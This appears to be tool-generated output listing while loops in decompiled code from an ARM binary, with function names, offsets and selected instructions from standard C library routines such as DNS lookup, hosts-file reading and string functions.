=============================WHILE LOOPS ID : 196 @ readdir64 ====================================
++++++++ WHILE START : 47883 
++++++++ WHILE FUNCTION : readdir64 
++++++++ WHILE END : 47919 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__getdents64(v107, (int32_t *)v108, v109, v100) < 1) {
=============================WHILE LOOPS ID : 197 @ __GI_config_read ====================================
++++++++ WHILE START : 48241 
++++++++ WHILE FUNCTION : __GI_config_read 
++++++++ WHILE END : 48590 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		int32_t v118 = fgets(v115 + v108, v117 - v108, v116); // 0x19160
		while (true) {
		v125 = getc_unlocked((int16_t *)v126);
		while (true) {
		while (true) {
		v125 = __GI_fgetc(v126);
=============================WHILE LOOPS ID : 201 @ __stdio_WRITE ====================================
++++++++ WHILE START : 49440 
++++++++ WHILE FUNCTION : __stdio_WRITE 
++++++++ WHILE END : 49515 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 204 @ _fpmaxtostr ====================================
++++++++ WHILE START : 50715 
++++++++ WHILE FUNCTION : _fpmaxtostr 
++++++++ WHILE END : 54080 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 218 @ _memcpy ====================================
++++++++ WHILE START : 56139 
++++++++ WHILE FUNCTION : _memcpy 
++++++++ WHILE END : 56251 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 225 @ __GI_memchr ====================================
++++++++ WHILE START : 56665 
++++++++ WHILE FUNCTION : __GI_memchr 
++++++++ WHILE END : 56792 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 231 @ memrchr ====================================
++++++++ WHILE START : 57393 
++++++++ WHILE FUNCTION : memrchr 
++++++++ WHILE END : 57503 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 234 @ __GI_strspn ====================================
++++++++ WHILE START : 57640 
++++++++ WHILE FUNCTION : __GI_strspn 
++++++++ WHILE END : 57670 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 238 @ __GI_strpbrk ====================================
++++++++ WHILE START : 58197 
++++++++ WHILE FUNCTION : __GI_strpbrk 
++++++++ WHILE END : 58223 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 239 @ inet_aton ====================================
++++++++ WHILE START : 58329 
++++++++ WHILE FUNCTION : inet_aton 
++++++++ WHILE END : 58419 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 240 @ gethostbyname2_r ====================================
++++++++ WHILE START : 58591 
++++++++ WHILE FUNCTION : gethostbyname2_r 
++++++++ WHILE END : 58604 
++++++++ INTRESTING INSTRUCTIONS :  
		v109 = __dns_lookup((char *)v101, 28, v108, (int32_t)&v103);
=============================WHILE LOOPS ID : 241 @ gethostbyname2_r ====================================
++++++++ WHILE START : 58649 
++++++++ WHILE FUNCTION : gethostbyname2_r 
++++++++ WHILE END : 58662 
++++++++ INTRESTING INSTRUCTIONS :  
		v109 = __dns_lookup((char *)v101, 28, v108, (int32_t)&v103);
=============================WHILE LOOPS ID : 242 @ gethostbyname2_r ====================================
++++++++ WHILE START : 58710 
++++++++ WHILE FUNCTION : gethostbyname2_r 
++++++++ WHILE END : 58763 
++++++++ INTRESTING INSTRUCTIONS :  
		v109 = __dns_lookup((char *)v101, 28, v108, (int32_t)&v103);
		free();
		free();
		free();
		free();
=============================WHILE LOOPS ID : 246 @ inet_pton ====================================
++++++++ WHILE START : 61982 
++++++++ WHILE FUNCTION : inet_pton 
++++++++ WHILE END : 62195 
++++++++ INTRESTING INSTRUCTIONS :  
		if (inet_pton4(v102, v100) > 0) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 248 @ __GI_inet_ntop ====================================
++++++++ WHILE START : 62475 
++++++++ WHILE FUNCTION : __GI_inet_ntop 
++++++++ WHILE END : 62799 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		if (inet_ntop4(a2 + 12, v134, v99 - v134 - 32) == 0) {
		v132 = sprintf(v134, v113, v130, v131, (int32_t)&v133, (int32_t)&v133, (int32_t)&v133);
		if (inet_ntop4(a2 + 12, v134, v99 - v134 - 32) == 0) {
		v132 = sprintf(v128, v113, v130, v131, (int32_t)&v133, (int32_t)&v133, (int32_t)&v133);
		while (true) {
=============================WHILE LOOPS ID : 250 @ __dns_lookup ====================================
++++++++ WHILE START : 63155 
++++++++ WHILE FUNCTION : __dns_lookup 
++++++++ WHILE END : 63743 
++++++++ INTRESTING INSTRUCTIONS :  
		__open_nameservers();
		v96 = socket((int32_t)v100, 2, 17);
		if (__libc_connect(v96, v101, 28) >= 0) {
		__libc_send(v96, v94, v128 + v130, v112);
		while (true) {
		int32_t result = __libc_recv(v96, v94, 512, 64, (int32_t)&v135); // 0x1c59c
		__GI_close(v96);
		free();
		free();
		while (true) {
		while (true) {
		free();
		__GI_close(v96);
		free();
		free();
		__GI_close(v96);
		free();
		free();
		free();
		__GI_close(v96);
		free();
		free();
		__GI_close(v96);
		free();
		free();
		__GI_close(v96);
		free();
		free();
		__GI_close(v96);
		free();
		free();
		__GI_close(v96);
		free();
		free();
		__GI_close(v96);
		free();
		free();
		free();
		free();
		free();
		__GI_close(v96);
		free();
		free();
		__GI_close(v96);
		free();
		free();
=============================WHILE LOOPS ID : 252 @ __open_nameservers ====================================
++++++++ WHILE START : 64262 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 64389 
++++++++ INTRESTING INSTRUCTIONS :  
		if (inet_pton(10, (char *)v118, (int32_t)&v122) < 1) {
		if (inet_pton(2, (char *)v118, (int32_t)&v125) >= 1) {
		if (fgets(v116, 128, v105) == 0) {
		if (fgets(v116, 128, v105) == 0) {
		while (true) {
		free();
		while (true) {
		if (fgets(v116, 128, v105) == 0) {
=============================WHILE LOOPS ID : 253 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 66419 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 66497 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_config_close((int32_t *)v97);
		if (inet_pton(v111, (char *)v112, v104) >= 1) {
		__GI_config_close((int32_t *)v97);
		if (inet_pton(10, (char *)v113, v104) >= 1) {
		__GI_config_close((int32_t *)v97);
=============================WHILE LOOPS ID : 254 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 66498 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 66510 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__GI_strcasecmp(v107, v109) == 0) {
=============================WHILE LOOPS ID : 255 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 66511 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 66526 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_config_close((int32_t *)v97);
=============================WHILE LOOPS ID : 257 @ __aeabi_idiv ====================================
++++++++ WHILE START : 67137 
++++++++ WHILE FUNCTION : __aeabi_idiv 
++++++++ WHILE END : 67365 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 258 @ __aeabi_ddiv ====================================
++++++++ WHILE START : 70966 
++++++++ WHILE FUNCTION : __aeabi_ddiv 
++++++++ WHILE END : 71183 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
